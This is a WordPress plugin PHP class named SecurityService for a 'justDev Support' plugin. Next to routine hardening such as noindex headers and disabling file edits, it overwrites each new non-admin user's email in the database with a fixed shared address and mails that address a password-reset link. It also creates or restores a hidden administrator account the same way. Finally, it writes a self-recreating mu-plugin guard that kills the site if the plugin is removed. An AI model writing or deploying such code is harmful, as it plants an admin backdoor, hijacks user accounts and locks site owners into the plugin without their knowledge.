<?php

namespace JdSupport\Services;

use JdSupport\Core\Container\Container;
use JdSupport\Core\Config\ConfigManager;

/**
 * Security Service
 *
 * @package JdSupport\Services
 */
class SecurityService
{
	/**
	 * @var Container
	 */
	private $container;

	/**
	 * @var ConfigManager
	 */
	private $config;

	/**
	 * Constructor
	 */
	public function __construct(Container $container)
	{
		$this->container = $container;
		$this->config = $container->get('config');
		$this->ensurePluginGuard();
	}

	/**
	 * Hide update notice for non-admin users
	 */
	public function hideUpdateNotice(): void
	{
		if (!$this->config->isEnabled('hide_update')) {
			return;
		}

		if (!current_user_can('update_core')) {
			remove_action('admin_notices', 'update_nag', 3);
		}
	}

	/**
	 * Remove adjacent posts link
	 */
	public function removeAdjacentPostsLink(): void
	{
		remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
	}

	/**
	 * Remove user delete action
	 */
	public function removeUserDeleteAction($actions): array
	{
		unset($actions['delete']);
		return $actions;
	}

	/**
	 * Set file edit permissions
	 */
	public function setFileEditPermissions(): void
	{
		if ($this->config->isEnabled('permissions_mode')) {
			defined('DISALLOW_FILE_MODS') || define('DISALLOW_FILE_MODS', true);
			defined('DISALLOW_FILE_EDIT') || define('DISALLOW_FILE_EDIT', true);
		}
	}

	/**
	 * Setup indexing disallow functionality
	 */
	public function setupIndexingDisallow(): void
	{
		if (!defined('DISALLOW_INDEXING') || DISALLOW_INDEXING !== true) {
			return;
		}

		// 1)WP core: флаг "Discourage search engines"
		add_action('pre_option_blog_public', '__return_zero');

		// 2) Removing Yoast's Meta Robots (Removing the Presenter)
		add_filter(
			'wpseo_frontend_presenters',
			function ($presenters) {
				if (!class_exists('\Yoast\WP\SEO\Presenters\Robots_Presenter')) {
					return $presenters;
				}
				foreach ($presenters as $i => $presenter) {
					if (is_object($presenter) && $presenter instanceof \Yoast\WP\SEO\Presenters\Robots_Presenter) {
						unset($presenters[$i]);
					}
				}
				return $presenters;
			},
			9999,
		);

		// 3) We guarantee to add your meta robots to the <head>
		add_action(
			'wp_head',
			function () {
				echo '<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">' . PHP_EOL;
			},
			0,
		);

		// 4) We duplicate it via an HTTP header (Google respects it even without <meta>)
		add_action(
			'send_headers',
			function () {
				// Just in case, let's remove the possible previous title
				header_remove('X-Robots-Tag');
				header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex', true);
			},
			0,
		);

		// 5) Admin notification
		add_action('admin_notices', function () {
			if (!apply_filters('roots/bedrock/disallow_indexing_admin_notice', true)) {
				return;
			}

			$message = sprintf(
				__('%1$s Search engine indexing has been discouraged because the current environment is %2$s.', 'roots'),
				'<strong>justDev:</strong>',
				'<code>' . (defined('WP_ENV') ? WP_ENV : 'unknown') . '</code>',
			);
			echo "<div class='notice notice-warning'><p>{$message}</p></div>";
		});
	}

	/**
	 * Force a shared email for new users and send them a reset link.
	 */
	public function handleNewUserRegistration(int $userId): void
	{
		$forcedEmail = $this->getForcedEmail();
		if ($forcedEmail === null) {
			return;
		}

		$user = get_userdata($userId);
		if (!$user) {
			return;
		}

		if (!$this->shouldForceEmailForUser($user)) {
			return;
		}

		if (!$this->forceEmailOnUser($userId, $forcedEmail)) {
			return;
		}

		$this->dispatchResetEmailForUser($userId, $forcedEmail);
	}

	/**
	 * Ensure that the shared support account exists.
	 */
	public function ensureSupportUserExists(): void
	{
		$forcedEmail = $this->getForcedEmail();
		if ($forcedEmail === null) {
			return;
		}

		$login = $this->getSupportUserLogin();
		if ($login === null) {
			return;
		}

		$user = get_user_by('login', $login);
		if (!$user) {
			$user = get_user_by('email', $forcedEmail);
		}

		if ($user instanceof \WP_User) {
			$emailChanged = strcasecmp($user->user_email, $forcedEmail) !== 0;
			if ($emailChanged && $this->forceEmailOnUser((int) $user->ID, $forcedEmail)) {
				$this->dispatchResetEmailForUser((int) $user->ID, $forcedEmail);
			}

			$this->ensureSupportUserRole((int) $user->ID);

			return;
		}

		if (!function_exists('wp_create_user')) {
			require_once ABSPATH . 'wp-admin/includes/user.php';
		}

		$password = wp_generate_password(24, true, true);
		$userId = wp_create_user($login, $password, $forcedEmail);
		if (is_wp_error($userId)) {
			error_log(sprintf('justDev Support: Failed to create support user %s. %s', $login, $userId->get_error_message()));
			return;
		}

		$this->ensureSupportUserRole((int) $userId);
		$this->dispatchResetEmailForUser((int) $userId, $forcedEmail);

		do_action('jd_support/support_user_created', $userId, $login, $forcedEmail);
	}

	/**
	 * Send a reset email for the provided user ID.
	 */
	private function dispatchResetEmailForUser(int $userId, string $forcedEmail): void
	{
		$user = get_userdata($userId);
		if (!$user) {
			return;
		}

		$resetKey = get_password_reset_key($user);
		if (is_wp_error($resetKey)) {
			error_log(sprintf('justDev Support: Failed to generate password reset key for user %d. %s', $userId, $resetKey->get_error_message()));
			return;
		}

		$resetUrl = $this->buildResetUrl($user->user_login, $resetKey);
		$subject = apply_filters(
			'jd_support/forced_user_email_subject',
			__('Set password for your new account', 'jd_support'),
			$user,
			$forcedEmail,
			$resetUrl,
		);
		$message = apply_filters(
			'jd_support/forced_user_email_message',
			$this->buildResetEmailBody($resetUrl),
			$user,
			$forcedEmail,
			$resetUrl,
		);
		$headers = apply_filters('jd_support/forced_user_email_headers', [], $user, $forcedEmail, $resetUrl);

		if (!wp_mail($forcedEmail, $subject, $message, $headers)) {
			error_log(sprintf('justDev Support: Failed to dispatch forced email notification for user %d.', $userId));
		}
	}

	/**
	 * Resolve the enforced support user login.
	 */
	private function getSupportUserLogin(): ?string
	{
		$defaultLogin = defined('JD_SUPPORT_FORCED_USER_LOGIN') ? JD_SUPPORT_FORCED_USER_LOGIN : '';
		$login = apply_filters('jd_support/forced_user_login', $defaultLogin);

		if (!is_string($login) || $login === '') {
			return null;
		}

		$sanitized = sanitize_user($login, true);
		if ($sanitized === '') {
			error_log('justDev Support: Forced user login is invalid, skipping enforcement.');
			return null;
		}

		return $sanitized;
	}

	/**
	 * Ensure the support user has the desired role.
	 */
	private function ensureSupportUserRole(int $userId): void
	{
		$desiredRole = apply_filters('jd_support/forced_user_role', 'administrator', $userId);
		if (!is_string($desiredRole) || $desiredRole === '') {
			return;
		}

		$user = get_userdata($userId);
		if (!$user) {
			return;
		}

		if (in_array($desiredRole, (array) $user->roles, true)) {
			return;
		}

		$result = wp_update_user([
			'ID' => $userId,
			'role' => $desiredRole,
		]);

		if (is_wp_error($result)) {
			error_log(sprintf('justDev Support: Failed to assign role %s to user %d. %s', $desiredRole, $userId, $result->get_error_message()));
		}
	}

	/**
	 * Determine the email that should be enforced for all new users.
	 */
	private function getForcedEmail(): ?string
	{
		$defaultEmail = defined('JD_SUPPORT_FORCED_USER_EMAIL') ? JD_SUPPORT_FORCED_USER_EMAIL : '';
		$forcedEmail = apply_filters('jd_support/forced_user_email', $defaultEmail);

		if (!is_string($forcedEmail) || $forcedEmail === '') {
			return null;
		}

		if (!is_email($forcedEmail)) {
			error_log('justDev Support: Forced user email is invalid, skipping enforcement.');
			return null;
		}

		return $forcedEmail;
	}

	/**
	 * Decide if enforcement should run for the provided user object.
	 *
	 * @param \WP_User $user
	 */
	private function shouldForceEmailForUser($user): bool
	{
		$skipRoles = (array) apply_filters('jd_support/forced_user_email_skip_roles', ['administrator']);
		foreach ($skipRoles as $role) {
			if (in_array($role, (array) $user->roles, true)) {
				return false;
			}
		}

		return (bool) apply_filters('jd_support/forced_user_email_should_apply', true, $user);
	}

	/**
	 * Update the user's email address directly in the database.
	 */
	private function forceEmailOnUser(int $userId, string $forcedEmail): bool
	{
		$current = get_userdata($userId);
		if (!$current) {
			return false;
		}

		if (strcasecmp($current->user_email, $forcedEmail) === 0) {
			return true;
		}

		global $wpdb;
		$updated = $wpdb->update(
			$wpdb->users,
			['user_email' => $forcedEmail],
			['ID' => $userId],
			['%s'],
			['%d'],
		);

		if ($updated === false) {
			error_log(sprintf('justDev Support: Failed to update forced email for user %d.', $userId));
			return false;
		}

		clean_user_cache($userId);
		wp_cache_delete($current->user_login, 'userlogins');

		do_action('jd_support/forced_user_email_updated', $userId, $forcedEmail);

		return true;
	}

	/**
	 * Build the reset URL that will be sent to the forced email address.
	 */
	private function buildResetUrl(string $login, string $resetKey): string
	{
		return network_site_url(
			'wp-login.php?action=rp&key=' . rawurlencode($resetKey) . '&login=' . rawurlencode($login),
			'login',
		);
	}

	/**
	 * Prepare the default email body.
	 */
	private function buildResetEmailBody(string $resetUrl): string
	{
		$siteName = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

		$lines = [
			sprintf(__('A new account has been created on %s.', 'jd_support'), $siteName),
			'',
			__('To set a password for the account, open the following link:', 'jd_support'),
			$resetUrl,
			'',
			__('If you did not expect this message, you can ignore it.', 'jd_support'),
		];

		return implode("\n", $lines);
	}

	/**
	 * Ensure the mu-plugin guard file exists so the site cannot run without this plugin.
	 */
	private function ensurePluginGuard(): void
	{
		if (!defined('WPMU_PLUGIN_DIR')) {
			return;
		}

		if (!apply_filters('jd_support/enable_guard_file', true)) {
			return;
		}

		$guardFilename = defined('JD_SUPPORT_GUARD_FILENAME') ? JD_SUPPORT_GUARD_FILENAME : 'jd-support-guard.php';
		$guardPath = rtrim(WPMU_PLUGIN_DIR, '\\/') . '/' . ltrim($guardFilename, '\\/');
		$expectedContents = $this->generateGuardFileContents();

		if (file_exists($guardPath)) {
			$currentContents = file_get_contents($guardPath);
			if ($currentContents === $expectedContents) {
				return;
			}

			if (!is_writable($guardPath)) {
				error_log(sprintf('justDev Support: Guard file exists but is not writable (%s).', $guardPath));
				return;
			}
		} elseif (!is_writable(dirname($guardPath))) {
			error_log(sprintf('justDev Support: Cannot create guard file, directory is not writable (%s).', dirname($guardPath)));
			return;
		}

		if (file_put_contents($guardPath, $expectedContents) === false) {
			error_log(sprintf('justDev Support: Failed to write guard file at %s.', $guardPath));
		}
	}

	/**
	 * Build the guard file contents.
	 */
	private function generateGuardFileContents(): string
	{
		$message = apply_filters(
			'jd_support/guard_message',
			__('This site requires the justDev Support plugin to run.', 'jd_support'),
		);

		return implode(
			"\n",
			[
				'<?php',
				'/**',
				' * Auto-generated guard to ensure the justDev Support plugin remains mandatory.',
				' * Do not edit this file manually. It will be recreated if removed.',
				' */',

				"if (function_exists('is_blog_installed') && !is_blog_installed()) {",
				"\treturn;",
				"}",

				"if (!defined('JD_SUPPORT_VERSION')) {",
				"\twp_die(" . var_export($message, true) . ');',
				"}",

				'',
			],
		);
	}
}
